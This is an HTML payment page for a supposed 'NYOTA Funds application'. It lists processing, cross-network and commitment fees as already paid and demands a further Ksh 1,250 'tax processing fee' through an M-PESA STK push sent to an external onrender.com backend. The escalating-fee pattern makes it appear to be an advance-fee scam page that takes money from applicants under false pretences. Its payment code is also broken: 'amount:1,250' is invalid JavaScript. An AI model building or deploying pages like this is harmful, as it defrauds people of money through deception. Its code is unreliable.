<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Final Tax Processing Stage</title>

<style>

body{
margin:0;
padding:15px;
background:#0b6b0b;
font-family:Arial,sans-serif;
}

.container{
max-width:420px;
margin:auto;
}

.card{
background:white;
padding:20px;
border-radius:10px;
}

h1{
text-align:center;
color:#1565c0;
font-size:24px;
margin-bottom:20px;
}

.status{
font-size:17px;
line-height:35px;
color:green;
text-align:center;
margin-bottom:20px;
}

.info{
text-align:center;
font-size:16px;
line-height:25px;
margin-bottom:20px;
}

.amount{
text-align:center;
font-size:22px;
font-weight:bold;
color:#1565c0;
margin-bottom:20px;
}

label{
display:block;
font-weight:bold;
margin-top:10px;
}

input{
width:100%;
padding:12px;
margin-top:6px;
border-radius:8px;
border:1px solid #ccc;
box-sizing:border-box;
}

button{
width:100%;
padding:14px;
margin-top:20px;
background:#1565c0;
color:white;
border:none;
border-radius:8px;
font-size:18px;
cursor:pointer;
}

#stkMessage{
margin-top:15px;
text-align:center;
font-size:15px;
color:#1565c0;
}

</style>
</head>

<body>

<div class="container">
<div class="card">

<h1>Final Tax Processing Stage</h1>

<div class="status">
✅ Processing Fee Paid<br>
✅ Cross-Network Fee Paid<br>
✅ Commitment Fee Paid
</div>

<div class="info">
Congratulations! Your application has reached the final tax processing stage. Complete the payment below to finalize the processing of your NYOTA Funds application.
</div>

<div class="amount">
Tax Processing Fee: Ksh 1,250
</div>

<label>Phone Number</label>

<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX">

<button id="payBtn" onclick="payNow()">
Pay Now
</button>

<p id="stkMessage"></p>

<script>
let btn = document.getElementById("payBtn");

async function payNow(){

let phone = document.getElementById("phone").value;

if(phone==""){
alert("Enter phone number");
return;
}

btn.disabled=true;
btn.innerHTML="Sending STK Push...";

try{

let response=await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone:phone,
amount:1,250
})
});

let data=await response.json();

console.log(data);

if(!data.success){
alert(data.message || "Payment failed");
btn.disabled=false;
btn.innerHTML="Pay Now";
return;
}

if(data.status=="completed"){
window.location.href="success.html";
return;
}

if(data.status=="pending"){

btn.innerHTML="Waiting for payment...";

document.getElementById("stkMessage").innerHTML=
"STK Push sent successfully. Please enter your M-PESA PIN on your phone. This page will continue automatically once payment is confirmed.";

let checkout=data.checkout_request_id;

let timer=setInterval(async()=>{

let res=await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/payment-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id:checkout
})
});

let status=await res.json();

console.log(status);

if(status.status=="completed"){

clearInterval(timer);

window.location.href="success.html";

}

if(status.status=="failed"){

clearInterval(timer);

alert("Payment failed");

btn.disabled=false;
btn.innerHTML="Pay Now";

}

},3000);

}

}catch(error){

console.log(error);

alert("Payment request failed");

btn.disabled=false;
btn.innerHTML="Pay Now";

}

}
</script>

</body>
</html>
